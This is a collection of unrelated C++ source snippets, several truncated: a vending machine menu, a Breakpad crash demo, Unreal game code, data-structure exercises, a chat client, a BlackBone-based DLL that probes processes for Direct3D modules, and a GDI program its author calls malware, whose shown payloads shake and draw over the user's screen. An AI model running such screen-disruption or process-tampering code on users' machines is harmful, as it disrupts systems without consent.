futuro tecle 2\" << endl;\n          cin >> resp;\n\n          // Repor produtos da maquina\n          if (resp == 1){\n\n            repor_prod();\n\n          }\n\n          // Calculo do lucro atual e futuro da maquina\n\n          else if(resp == 2 ){\n\n            lucro_at_ft();\n\n          } \n        }\n\n        // Senha incorreta do Modo ADM \n        else {\n\n          cout << \"Senha incorreta! Deseja tentar novamente?\" << endl;\n\n          cout << \"(S)im ou (N)ao\" << endl;\n          cin >> count;\n\n        }\n\n        cout << \"Deseja fazer uma nova operacao?\" << endl; \n\n        cout << \"(S)im ou (N)ao\" << endl;\n        cin",
    "// Copyright 2012 Google LLC\n//\n// Redistribution and use in source and binary forms, with or without\n// modification, are permitted provided that the following conditions are\n// met:\n//\n//     * Redistributions of source code must retain the above copyright\n// notice, this list of conditions and the following disclaimer.\n//     * Redistributions in binary form must reproduce the above\n// copyright notice, this list of conditions and the following disclaimer\n// in the documentation and/or other materials provided with the\n// distribution.\n//     * Neither the name of Google LLC nor the names of its\n// contributors may be used to endorse or promote products derived from\n// this software without specific prior written permission.\n//\n// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n// \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n// LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\n// A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\n// OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\n// SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\n// LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\n// DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\n// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n// (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\n// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\n#include <stdio.h>\n\n#include \"client/linux/handler/exception_handler.h\"\n#include \"client/linux/handler/minidump_descriptor.h\"\n\nnamespace {\n\nbool DumpCallback(const google_breakpad::MinidumpDescriptor& descriptor,\n                  void* context,\n                  bool succeeded) {\n  printf(\"Dump path: %s\\n\", descriptor.path());\n  return succeeded;\n}\n\nvoid Crash() {\n  volatile int* a = reinterpret_cast<volatile int*>(NULL);\n  *a = 1;\n}\n\n}  // namespace\n\nint main(int argc, char* argv[]) {\n  google_breakpad::MinidumpDescriptor descriptor(\".\");\n  google_breakpad::ExceptionHandler eh(descriptor, NULL, DumpCallback,\n                                       NULL, true, -1);\n  Crash();\n  return 0;\n}\n",
    "// dllmain.cpp : Defines the entry point for the DLL application.\r\n#include <Windows.h>\r\n#include <BlackBone/Process/Process.h>\r\ntypedef const wchar_t* widestring;\r\nusing namespace std;\r\n#define DLLEXPORT extern \"C\" __declspec(dllexport)\r\n\r\nDLLEXPORT bool __stdcall GetDX11DLL(widestring str) {\r\n    blackbone::Process* proc = 0;\r\n    NTSTATUS st = proc->Attach((widestring)str, 3451UL);\r\n    if (st) {\r\n        return false;\r\n    }\r\n    else\r\n    {\r\n        blackbone::ProcessModules* mod_proc = 0;\r\n        blackbone::ModuleDataPtr moduledata_d3d11 = (blackbone::ModuleDataPtr)mod_proc->GetModule(L\"d3d11.dll\");\r\n        if (!moduledata_d3d11)\r\n        {\r\n            printf(\"Failed to Find D3D11 Module!!!\");\r\n            return false;\r\n        }\r\n        else {\r\n            return true;\r\n        }\r\n    }\r\n}\r\nDLLEXPORT bool __stdcall GetDX9DLL(widestring str) {\r\n    blackbone::Process* proc = 0;\r\n    NTSTATUS st = proc->Attach((widestring)str, 3451UL);\r\n    if (st) {\r\n        return false;\r\n    }\r\n    else {\r\n        blackbone::ProcessModules* mod_proc = 0;\r\n        blackbone::ModuleDataPtr moduledata_d3d11 = (blackbone::ModuleDataPtr)mod_proc->GetModule(L\"d3d9.dll\");\r\n        if (!moduledata_d3d11)\r\n        {\r\n            printf(\"Failed to Find D3D9 Module!!!\");\r\n            return false;\r\n        }\r\n        else {\r\n            return true;\r\n        }\r\n    }\r\n}\r\nBOOL APIENTRY DllMain( HMODULE hModule,\r\n                       DWORD  ul_reason_for_call,\r\n                       LPVOID lpReserved\r\n                     )\r\n{\r\n    switch (ul_reason_for_call)\r\n    {\r\n    case DLL_PROCESS_ATTACH:\r\n    case DLL_THREAD_ATTACH:\r\n    case DLL_THREAD_DETACH:\r\n    case DLL_PROCESS_DETACH:\r\n        break;\r\n    }\r\n    return TRUE;\r\n}\r\n\r\n",
    "\ufeff#include <Windows.h>\r\n#include <windowsx.h>\r\n#include <tchar.h>\r\n#include <stdio.h>\r\n#pragma comment(lib, \"winmm.lib\")\r\n#pragma comment(lib, \"Msimg32.lib\")\r\n#define M_PI   3.14159265358979323846264338327950288\r\n#include <time.h>\r\n#include <ctime>\r\n#include <math.h>\r\n#include <cmath>\r\n#include <cstdlib>\r\ntypedef union _RGBQUAD {\r\n\tCOLORREF rgb;\r\n\tstruct {\r\n\t\tBYTE b;\r\n\t\tBYTE g;\r\n\t\tBYTE r;\r\n\t\tBYTE Reserved;\r\n\t};\r\n}_RGBQUAD, *PRGBQUAD;\r\n//typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);\r\n//typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);\r\ntypedef struct\r\n{\r\n\tFLOAT h;\r\n\tFLOAT s;\r\n\tFLOAT l;\r\n} HSL;\r\n\r\nnamespace Colors\r\n{\r\n\t//These HSL functions was made by Wipet, credits to him!\r\n\t//OBS: I used it in 3 payloads\r\n\r\n\t//Btw ArTicZera created HSV functions, but it sucks unfortunatelly\r\n\t//So I didn't used in this malware.\r\n\r\n\tHSL rgb2hsl(RGBQUAD rgb)\r\n\t{\r\n\t\tHSL hsl;\r\n\r\n\t\tBYTE r = rgb.rgbRed;\r\n\t\tBYTE g = rgb.rgbGreen;\r\n\t\tBYTE b = rgb.rgbBlue;\r\n\r\n\t\tFLOAT _r = (FLOAT)r / 255.f;\r\n\t\tFLOAT _g = (FLOAT)g / 255.f;\r\n\t\tFLOAT _b = (FLOAT)b / 255.f;\r\n\r\n\t\tFLOAT rgbMin = min(min(_r, _g), _b);\r\n\t\tFLOAT rgbMax = max(max(_r, _g), _b);\r\n\r\n\t\tFLOAT fDelta = rgbMax - rgbMin;\r\n\t\tFLOAT deltaR;\r\n\t\tFLOAT deltaG;\r\n\t\tFLOAT deltaB;\r\n\r\n\t\tFLOAT h = 0.f;\r\n\t\tFLOAT s = 0.f;\r\n\t\tFLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);\r\n\r\n\t\tif (fDelta != 0.f)\r\n\t\t{\r\n\t\t\ts = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));\r\n\t\t\tdeltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);\r\n\t\t\tdeltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);\r\n\t\t\tdeltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);\r\n\r\n\t\t\tif (_r == rgbMax)      h = deltaB - deltaG;\r\n\t\t\telse if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;\r\n\t\t\telse if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;\r\n\t\t\tif (h < 0.f)           h += 1.f;\r\n\t\t\tif (h > 1.f)           h -= 1.f;\r\n\t\t}\r\n\r\n\t\thsl.h = h;\r\n\t\thsl.s = s;\r\n\t\thsl.l = l;\r\n\t\treturn hsl;\r\n\t}\r\n\r\n\tRGBQUAD hsl2rgb(HSL hsl)\r\n\t{\r\n\t\tRGBQUAD rgb;\r\n\r\n\t\tFLOAT r = hsl.l;\r\n\t\tFLOAT g = hsl.l;\r\n\t\tFLOAT b = hsl.l;\r\n\r\n\t\tFLOAT h = hsl.h;\r\n\t\tFLOAT sl = hsl.s;\r\n\t\tFLOAT l = hsl.l;\r\n\t\tFLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);\r\n\r\n\t\tFLOAT m;\r\n\t\tFLOAT sv;\r\n\t\tFLOAT fract;\r\n\t\tFLOAT vsf;\r\n\t\tFLOAT mid1;\r\n\t\tFLOAT mid2;\r\n\r\n\t\tINT sextant;\r\n\r\n\t\tif (v > 0.f)\r\n\t\t{\r\n\t\t\tm = l + l - v;\r\n\t\t\tsv = (v - m) / v;\r\n\t\t\th *= 6.f;\r\n\t\t\tsextant = (INT)h;\r\n\t\t\tfract = h - sextant;\r\n\t\t\tvsf = v * sv * fract;\r\n\t\t\tmid1 = m + vsf;\r\n\t\t\tmid2 = v - vsf;\r\n\r\n\t\t\tswitch (sextant)\r\n\t\t\t{\r\n\t\t\tcase 0:\r\n\t\t\t\tr = v;\r\n\t\t\t\tg = mid1;\r\n\t\t\t\tb = m;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 1:\r\n\t\t\t\tr = mid2;\r\n\t\t\t\tg = v;\r\n\t\t\t\tb = m;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 2:\r\n\t\t\t\tr = m;\r\n\t\t\t\tg = v;\r\n\t\t\t\tb = mid1;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 3:\r\n\t\t\t\tr = m;\r\n\t\t\t\tg = mid2;\r\n\t\t\t\tb = v;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 4:\r\n\t\t\t\tr = mid1;\r\n\t\t\t\tg = m;\r\n\t\t\t\tb = v;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 5:\r\n\t\t\t\tr = v;\r\n\t\t\t\tg = m;\r\n\t\t\t\tb = mid2;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\trgb.rgbRed = (BYTE)(r * 255.f);\r\n\t\trgb.rgbGreen = (BYTE)(g * 255.f);\r\n\t\trgb.rgbBlue = (BYTE)(b * 255.f);\r\n\r\n\t\treturn rgb;\r\n\t}\r\n}\r\nint red, green, blue;\r\nbool ifcolorblue = false, ifblue = false;\r\nCOLORREF Hue(int length) { //Credits to Void_/GetMBR\r\n\tif (red != length) {\r\n\t\tred < length; red++;\r\n\t\tif (ifblue == true) {\r\n\t\t\treturn RGB(red, 0, length);\r\n\t\t}\r\n\t\telse {\r\n\t\t\treturn RGB(red, 0, 0);\r\n\t\t}\r\n\t}\r\n\telse {\r\n\t\tif (green != length) {\r\n\t\t\tgreen < length; green++;\r\n\t\t\treturn RGB(length, green, 0);\r\n\t\t}\r\n\t\telse {\r\n\t\t\tif (blue != length) {\r\n\t\t\t\tblue < length; blue++;\r\n\t\t\t\treturn RGB(0, length, blue);\r\n\t\t\t}\r\n\t\t\telse {\r\n\t\t\t\tred = 0; green = 0; blue = 0;\r\n\t\t\t\tifblue = true;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n\r\nDWORD WINAPI balls(LPVOID lpParam) {\r\n\tint w = GetSystemMetrics(0), h = GetSystemMetrics(1);\r\n\tint signX = 1;\r\n\tint signY = 1;\r\n\tint signX1 = 1;\r\n\tint signY1 = 1;\r\n\tint incrementor = 10;\r\n\tint x = 10;\r\n\tint y = 10;\r\n\twhile (1) {\r\n\t\tHDC hdc = GetDC(0);\r\n\t\tint top_x = 0 + x;\r\n\t\tint top_y = 0 + y;\r\n\t\tint bottom_x = 100 + x;\r\n\t\tint bottom_y = 100 + y;\r\n\t\tx += incrementor * signX;\r\n\t\ty += incrementor * signY;\r\n\t\tHBRUSH brush = CreateSolidBrush(Hue(239));\r\n\t\tSelectObject(hdc, brush);\r\n\t\tEllipse(hdc, top_x, top_y, bottom_x, bottom_y);\r\n\t\tif (y >= GetSystemMetrics(SM_CYSCREEN))\r\n\t\t{\r\n\t\t\tsignY = -1;\r\n\t\t}\r\n\r\n\t\tif (x >= GetSystemMetrics(SM_CXSCREEN))\r\n\t\t{\r\n\t\t\tsignX = -1;\r\n\t\t}\r\n\r\n\t\tif (y == 0)\r\n\t\t{\r\n\t\t\tsignY = 1;\r\n\t\t}\r\n\r\n\t\tif (x == 0)\r\n\t\t{\r\n\t\t\tsignX = 1;\r\n\t\t}\r\n\t\tSleep(10);\r\n\t\tDeleteObject(brush);\r\n\t\tReleaseDC(0, hdc);\r\n\t}\r\n}\r\n\r\nDWORD WINAPI shake(LPVOID lpParam) {\r\n\twhile (1) {\r\n\t\tHDC hdc = GetDC(0);\r\n\t\tint w = GetSystemMetrics(0);\r\n\t\tint h = GetSystemMetrics(1);\r\n\t\tBitBlt(hdc, rand() % 5, rand() % 5, w, h, hdc, rand() % 5, rand() % 5, SRCCOPY);\r\n\t\tSleep(10);\r\n\t\tReleaseDC(0, hdc);\r\n\t}\r\n}\r\n\r\nDWORD WINAPI blur(LPVOID lpParam) {\r\n\tHDC hdc = GetDC(NULL);\r\n\tHDC dcCopy = CreateCompatibleDC(hdc);\r\n\tint w = GetSystemMetrics(0);\r\n\tint h = GetSystemMetrics(1);\r\n\r\n\tBITMAPINFO bmpi = { 0 };\r\n\tBLENDFUNCTION blur;\r\n\tHBITMAP bmp;\r\n\r\n\tbmpi.bmi",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"ABCharacter.h\"\n#include \"GameFramework/SpringArmComponent.h\"\n#include\"ABBullet.h\"\n#include \"Camera/CameraComponent.h\"\n#include\"ABAnimInstance.h\"\n#include\"ABPlayerState.h\"\n#include\"ABPlayerStatComponent.h\"\n#include\"ABHUDWidget.h\"\n#include\"ABPlayerController.h\"\n// Sets default values\nAABCharacter::AABCharacter()\n{\n \t// Set this character to call Tick() every frame.  You can turn this off to improve performance if you don't need it.\n\tPrimaryActorTick.bCanEverTick = true;\n\n\tSpringArm = CreateDefaultSubobject<USpringArmComponent>(TEXT(\"SpringArm\"));\n\tCamera = CreateDefaultSubobject<UCameraComponent>(TEXT(\"Camera\"));\n\tSpringArm->SetupAttachment(GetRootComponent());\n\tCamera->SetupAttachment(SpringArm);\n\n\tGetMesh()->SetRelativeLocationAndRotation(FVector(0.f, 0.f, -88.f),FRotator\n\t(0.f,-90.f,0.f));\n\n\tCharacterStat = CreateAbstractDefaultSubobject<UABPlayerStatComponent>(TEXT(\"CHARACTERSTAT\"));\n\tABPlayerState = CreateAbstractDefaultSubobject<AABPlayerState>(TEXT(\"CHARACTERSTATE\"));\n\n\tSpringArm->TargetArmLength = 600.f;\n\tSpringArm->SetRelativeLocation(FVector(0.f, 0.f, 110.f));\n\tSpringArm->SetRelativeRotation(FRotator(-15.f, 0.f, 0.f));\n\n\tSpringArm->bUsePawnControlRotation = true;\n\tSpringArm->bInheritPitch = true;\n\tSpringArm->bInheritRoll = true;\n\tSpringArm->bInheritYaw = true;\n\n\n\tstatic ConstructorHelpers::FObjectFinder<USkeletalMesh> PlayerAS_Name (TEXT(\"/Script/Engine.SkeletalMesh'/Game/ParagonMurdock/Characters/Heroes/Murdock/Meshes/Murdock.Murdock'\"));\n\tif (PlayerAS_Name.Succeeded())\n\t{\n\t\tGetMesh()->SetSkeletalMesh(PlayerAS_Name.Object);\n\t\n\t}\n\n\tGetMesh()->SetAnimationMode(EAnimationMode::AnimationBlueprint);\n\tstatic ConstructorHelpers::FClassFinder<UAnimInstance> Player_Animation(TEXT(\"/Script/Engine.AnimBlueprint'/Game/Animation/ANI_ABChar.ANI_ABChar_C'\"));\n\tif (Player_Animation.Succeeded())\n\t{\n\t\tGetMesh()->SetAnimInstanceClass(Player_Animation.Class);\n\n\t}\n\t\n\tbAttackMode = false;\n\n\tGetCharacterMovement()->JumpZVelocity = 600.f;\n\n\tBulletList = AABBullet::StaticClass();\n\n\t\n\t//MaxBulletNum = 30;\n\t//BulletNum = MaxBulletNum;\n\n\t\n\t\n\t\n\n\t\n}\n\n// Called when the game starts or when spawned\nvoid AABCharacter::BeginPlay()\n{\n\tSuper::BeginPlay();\n\n\t\n\t\tABPlayerController = Cast<AABPlayerController>(GetController());\n\n\t\tif (ABPlayerController!=nullptr)\n\t\t{\n\t\t\tABPlayerController->GetHUDWidget()->BindCharacterStat(CharacterStat);\n\n\n\t\t\t ABPlayerState = Cast<AABPlayerState>(GetPlayerState());\n\t\t\tif (ABPlayerState != nullptr)\n\t\t\t{\n\t\t\t\tCharacterStat->SetNewLevel(ABPlayerState->GetCharLevel());\n\t\t\t}\n\n\t\t\n\t\t}\n\n\t\t\n\t\n\t\n\t\n\n}\n\n// Called every frame\nvoid AABCharacter::Tick(float DeltaTime)\n{\n\tSuper::Tick(DeltaTime);\n\n}\n\n// Called to bind functionality to input\nvoid AABCharacter::SetupPlayerInputComponent(UInputComponent* PlayerInputComponent)\n{\n\tSuper::SetupPlayerInputComponent(PlayerInputComponent);\n\tPlayerInputComponent->BindAxis(TEXT(\"RightLeft\"), this, &AABCharacter::RightLeft);\n\tPlayerInputComponent->BindAxis(TEXT(\"UpDown\"), this, &AABCharacter::UpDown);\n\tPlayerInputComponent->BindAxis(TEXT(\"LookUp\"), this, &AABCharacter::LookUp);\n\tPlayerInputComponent->BindAxis(TEXT(\"Turn\"), this, &AABCharacter::Turn);\n\t\n\n\tPlayerInputComponent->BindAction(TEXT(\"Attack\"), EInputEvent::IE_Pressed, this, &AABCharacter::NormalAttackStart);\n\tPlayerInputComponent->BindAction(TEXT(\"Attack\"), EInputEvent::IE_Released, this, &AABCharacter::NormalAttackEnd);\n\tPlayerInputComponent->BindAction(TEXT(\"Zoom\"), EInputEvent::IE_Pressed, this, &AABCharacter::Zoom);\n\tPlayerInputComponent->BindAction(TEXT(\"Jump\"), EInputEvent::IE_Pressed, this, &AABCharacter::Jump);\n\tPlayerInputComponent->BindAction(TEXT(\"Reroad\"), EInputEvent::IE_Pressed,this, &AABCharacter::Reload);\n}\n\nvoid AABCharacter::PostInitializeComponents()\n{\n\tSuper::PostInitializeComponents();\n\tABAnim = Cast<UABAnimInstance>(GetMesh()->GetAnimInstance());\n\n\t//\ucd1d\uc54c\ubc1c\uc0ac\n\tABAnim->OnFireBulletDelegate.AddLambda([this]()->void {\n\n\t\tif(ABPlayerState->GetCurBullet() >0)\n\t\t{\n\t\t\t\n\t\t\tFTransform fireposition = GetMesh()->GetSocketTransform(TEXT(\"Muzzle\"));\n\n\n\t\t\tAABBullet* Bullet = GetWorld()->SpawnActor<AABBullet>(BulletList, fireposition);\n\t\t\tif (Bullet)\n\t\t\t{\n\t\t\t\tFVector LaunchDirection = Camera->GetForwardVector();\n\n\t\t\t\t//FVector LaunchDirection = Camera->GetRightVector(); \uc774\uac78 \ucd1d\ud0c4\ub5a8\uc5b4\uc9c0\ub294\uac78\ub85c\ud558\ub2c8 \uba4b\uc788\uc5b4\uc9d0\n\n\t\t\t\tBullet->FireInDirection(LaunchDirection);\n\t\t\t}\n\t\t\tABPlayerState->SetCurBullet(-1);\n\t\t\t\n\t\t}\n\n\n\t\t\n\n\t\t});\n\n\t//\uc7ac\uc7a5\uc804\n\tABAnim->OnReloadDelegate.AddLambda([this]()->void {\n\n\n\t\tbReload = false;\n\t\tABPlayerState->ReLoadBullet(ABPlayerState->GetMaxBullet());\n\t\t});\n\n}\n\nvoid AABCharacter::UpDown(float Axis)\n{\n\tif (!bAttackMode)\n\t{\n\t\tAddMovementInput(GetActorForwardVector(), Axis);\n\t}\n}\n\nvoid AABCharacter::RightLeft(float Axis)\n{\n\tif (!bAttackMode)\n\t{\n\t\tAddMovementInput(GetActorRightVector(), Axis);\n\n\t}\n}\n\nvoid AABCharacter::LookUp(float Axis)\n{\n\tAddControllerPitchInput(-Axis);\n}\n\nvoid AABCharacter::Turn(float Axis)\n{\n\tAddControllerYawInput(Axis);\n}\n\nvoid A",
    "//============================================================================\n// Name         : Polynomial Calculator \n// Author       : Sadaf Habib\n// Version      : 1.0\n// Date Created : 23-09-2023\n// Date Modified: \n// Description  : Linked List class used for Polynomial Calculagtor\n//============================================================================\n\n#include \"linkedlist.h\"\n\n// Constructor to create an empty linked list\nLinkedList::LinkedList() {\n    head = nullptr; // Initialize the head pointer to nullptr for an empty list\n}\n\n// Method to insert a new term (node) into the linked list while maintaining order\nvoid LinkedList::insert(int coef, int expo) {\n    Node* newNode = new Node(coef, expo); // Create a new node with the given coefficient and exponent\n\n    // Check if the list is empty or the new node's exponent is greater than the head's exponent\n    if (head == nullptr || expo > head->expo) {\n        newNode->next = head; // Set the new node's next pointer to the current head\n        head = newNode; // Update the head to the new node\n    } else {\n        Node* current = head;\n\n        // Traverse the list to find the correct position to insert the new node\n        while (current->next != nullptr && current->next->expo >= expo) {\n            current = current->next;\n        }\n\n        newNode->next = current->next; // Set the new node's next pointer to the next node\n        current->next = newNode; // Update the current node's next pointer to the new node\n    }\n}\n\n// Method to print the linked list in the specified format\nvoid LinkedList::print(ostream& os) const {\n    Node* current = head;\n\n    // Traverse the list and print each term in the specified format\n    while (current != nullptr) {\n        os << current->coef << \"x^\" << current->expo;\n\n        if (current->next != nullptr) {\n            os << \" + \"; // Add a plus sign if there are more terms\n        }\n\n        current = current->next;\n    }\n\n    os << endl; // Add a newline at the end of the printed list\n}\n\n// Method to remove all nodes in the linked list\nvoid LinkedList::removeAll() {\n    while (head != nullptr) {\n        Node* temp = head;\n        head = head->next; // Move the head to the next node\n        delete temp; // Delete the current node\n    }\n}\n\n// Destructor to clean up all nodes in the linked list\nLinkedList::~LinkedList() {\n    removeAll(); // Call the removeAll method to delete all nodes\n}\n",
    "#include <thread>\n#include <wx/wx.h>\n#include <string>\n#include <fstream>\n#include \"CLIENT_INTERFACE.h\"\n#include \"net_message.h\"\n#include \"MainFrame.h\"\n#include \"timer.h\"\n\n//NETWORKING STRINGS\nwxScrolledWindow* scrolledMessageWindow;\nwxBoxSizer* messagesSizer;\n\n//Sizers\nwxBoxSizer* masterSizer;\nwxBoxSizer* sendMessageSizer;\n\n//Message send section\nwxTextCtrl* messageInputCtrl;\nwxButton* sendMessageButton;\n\nwxTextCtrl* tempName;\nwxTextCtrl* tempMessage;\n\nwxFont stdFont = wxFont(wxFontInfo(14));\nwxFont nameFont = wxFont(wxFontInfo(20).Bold());\n\nusing namespace std;\n\nCustomClient CLI;\nstring THIS_USERNAME = \"\";\n\nstring logName;\nofstream finalLog;\nmutex mtx;\n\nvoid MainFrame::BindEventHandlers()\n{\n  this->Bind(wxEVT_CLOSE_WINDOW, &MainFrame::ConfirmClose, this);\n  sendMessageButton->Bind(wxEVT_BUTTON, &MainFrame::SendMessageHandler, this);\n}\n\n//NOTE: scrolledMessageWindow MUST BE PARENT OF ALL MESSAGES\n\nvoid MainFrame::AddMessageToWindow(const string& name, const string& message)\n{\n  tempName = new wxTextCtrl(scrolledMessageWindow, wxID_ANY, name + ':', wxDefaultPosition\n                      , wxDefaultSize, wxTE_READONLY | wxBORDER_NONE);\n  tempName->SetFont(nameFont);\n  tempName->SetBackgroundColour(*wxTransparentColor); \n  tempMessage = new wxTextCtrl(scrolledMessageWindow, wxID_ANY, message, wxDefaultPosition\n                                           , wxDefaultSize, wxTE_MULTILINE | wxTE_READONLY | wxTE_NO_VSCROLL | wxBORDER_NONE);\n  tempMessage->SetFont(stdFont);\n  tempMessage->SetBackgroundColour(*wxTransparentColor);\n  messagesSizer->Add(tempName, 1, wxEXPAND | wxBOTTOM, 5);\n  messagesSizer->Add(tempMessage, 2, wxEXPAND | wxBOTTOM, 12);\n}\n\nvoid MainFrame::AddMessageToWindow(char* nameInput, char* messageInput)\n{\n  string name;\n  string message;\n  while(*nameInput != '\\0')\n  {\n    name += *nameInput;\n    nameInput++;\n  }\n  while(*messageInput != '\\0')\n  {\n    message += *messageInput;\n    messageInput++;\n  }\n  tempName = new wxTextCtrl(scrolledMessageWindow, wxID_ANY, name + ':', wxDefaultPosition, wxDefaultSize, wxTE_READONLY | wxBORDER_NONE);\n  tempName->SetFont(nameFont);\n  tempName->SetBackgroundColour(*wxTransparentColor);\n  tempMessage = new wxTextCtrl(scrolledMessageWindow, wxID_ANY, message, wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxTE_READONLY | wxTE_NO_VSCROLL | wxBORDER_NONE);\n  tempMessage->SetFont(stdFont);\n  tempMessage->SetBackgroundColour(*wxTransparentColor);\n  messagesSizer->Add(tempName, 1, wxEXPAND | wxBOTTOM, 5);\n  messagesSizer->Add(tempMessage, 2, wxEXPAND | wxBOTTOM, 12);\n}\n\n\nMainFrame::MainFrame(const wxString& title) : wxFrame(nullptr, wxID_ANY, title\n, wxDefaultPosition, wxDefaultSize, wxDEFAULT_FRAME_STYLE & ~wxMAXIMIZE_BOX & ~wxRESIZE_BORDER)\n{\n  this->Center();\n  this->SetClientSize(400,600);\n  //SIZERS DEFINITION\n  masterSizer = new wxBoxSizer(wxVERTICAL);\n  sendMessageSizer = new wxBoxSizer(wxHORIZONTAL);\n  messagesSizer = new wxBoxSizer(wxVERTICAL);\n\n  //SEND MESSAGEES ELEMENTS DEFINITION\n  sendMessageButton = new wxButton(this, wxID_ANY, \"Send\", wxDefaultPosition, wxDefaultSize);\n  messageInputCtrl = new wxTextCtrl(this, wxID_ANY, \"Type a message...\", wxDefaultPosition, wxDefaultSize);\n  scrolledMessageWindow = new wxScrolledWindow(this, wxID_ANY);\n  scrolledMessageWindow->SetSizer(messagesSizer);\n  scrolledMessageWindow->SetScrollbars(0,1,1,1);\n\n  //ADDING SENDING MESSAGES ELEMENTS TO THEIR SIZER\n  sendMessageSizer->Add(messageInputCtrl, 5);\n  sendMessageSizer->Add(sendMessageButton, 1);\n\n  //SIZER APPLICATION\n  this->SetSizerAndFit(masterSizer);\n  masterSizer->Add(scrolledMessageWindow, 9, wxEXPAND | wxALL, 5);\n  masterSizer->Add(sendMessageSizer, 1, wxEXPAND | wxALL, 5);\n\n  //NETWORKING STUFF\n  CLI.InitalizeServer();\n  while(THIS_USERNAME == \"\")\n  {\n    CLI.RequestName();\n    THIS_USERNAME = CLI.UsernameListen();\n  }\n\n  //Clearing update_loop.txt \n  ofstream clearFile(\"update_loop.txt\");\n  clearFile << \"\";\n  clearFile.close();\n\n  BindEventHandlers();\n  thread updateLoop = thread([&]()\n                             {\n                              string namePart;\n                              string contentPart;\n                             while(true)\n                             {\n                              ofstream tempFile(\"update_loop.txt\", std::ios::app);\n                              string returnedString = CLI.StringListen();\n                              bool isFound = false;\n                             namePart = \"\"; contentPart = \"\";\n                              for(int i = 0; i < returnedString.size(); i++)\n                              {\n                                if(returnedString[i] == ' ')\n                                  isFound = true;\n                                if(isFound == false)\n                                  namePart += returnedString[i];\n                                if(isFound == true)\n                                  contentPart += returnedString[i];\n                              }\n                             ",
    "#include<bits/stdc++.h> \n\nusing namespace std; \n\nclass node{\n    public: \n       int data; \n       node* left;\n       node* right; \n    node(int d){\n       this -> data = d; \n       this -> left = NULL; \n       this -> right = NULL; \n    }\n};\n\nnode* buildTree(node* root){\n      cout << \"Enter the data \" << \" \";\n      int data; \n      cin >> data ;\n      root = new node(data); \n\n      if(data == -1){\n        return NULL; \n      }\n\n      cout<<\"Enter the data for inserting in left of \"  << data << endl;\n      root -> left = buildTree(root -> left); \n      cout<<\"Enter the data for inserting in right of \" << data << endl; \n      root -> right = buildTree(root -> right); \n      return root;  \n}\n\nvoid levelordertraversal(node* root){\n    queue<node*>q; \n    q.push(root); \n    q.push(NULL); \n    while(!q.empty()){\n        node* temp = q.front(); \n        q.pop(); \n        \n        if(temp == NULL){\n            cout<<endl; \n            if(!q.empty()){\n                q.push(NULL); \n            }\n        }\n        else{\n          cout<<temp -> data <<\" \"; \n        if(temp -> left){\n            q.push(temp -> left); \n        }\n        \n        if(temp -> right){\n            q.push(temp -> right); \n        }\n        }\n    }\n}\nvoid preordertraversal(node* root){\n    if(root == NULL){\n        return; \n    }\n\n    cout << root -> data << \" \"; \n    preordertraversal(root -> left); \n    preordertraversal(root -> right); \n}\n\nvoid postordertraversal(node* root){\n    if(root == NULL){\n        return; \n    }\n\n    postordertraversal(root -> left); \n    postordertraversal(root -> right); \n    cout << root -> data << \" \"; \n}\n\n\nvoid inordertraversal(node* root){\n    if(root == NULL){\n        return; \n    }\n    inordertraversal(root -> left); \n    cout << root -> data <<\" \"; \n    inordertraversal(root -> right); \n}\n\nvoid buildFromLevelOrder(node* &root) {\n    queue<node*> q;\n\n    cout << \"Enter data for root\" << endl;\n    int data ;\n    cin >> data;\n    root = new node(data);\n    \n    q.push(root);\n\n    while(!q.empty()) {\n        node* temp = q.front();\n        q.pop();\n\n        cout << \"Enter left node for: \" << temp->data << endl;\n        int leftData;\n        cin >> leftData;\n\n        if(leftData != -1) {\n            temp -> left = new node(leftData);\n            q.push(temp->left);\n        }\n\n        cout << \"Enter right node for: \" << temp->data << endl;\n        int rightData;\n        cin >> rightData;\n\n        if(rightData != -1) {\n            temp -> right = new node(rightData);\n            q.push(temp->right);\n        }\n    }\n }\n\n\nint main(void){\n    node* root = NULL; \n    //root = buildTree(root); \n   // cout<<\"Printing the level order traversal \" << endl;\n    // levelordertraversal(root); \n    // cout<<endl;\n    // cout<<\"Preorder traversal is: \" << endl; \n    // preordertraversal(root); \n    // cout<<endl;\n    // cout << \"PostOrder traversal is: \" << endl; \n    // postordertraversal(root);\n    // cout<<endl;  \n    // cout << \"Inorder traversal is: \" << endl; \n    // inordertraversal(root); \n    // 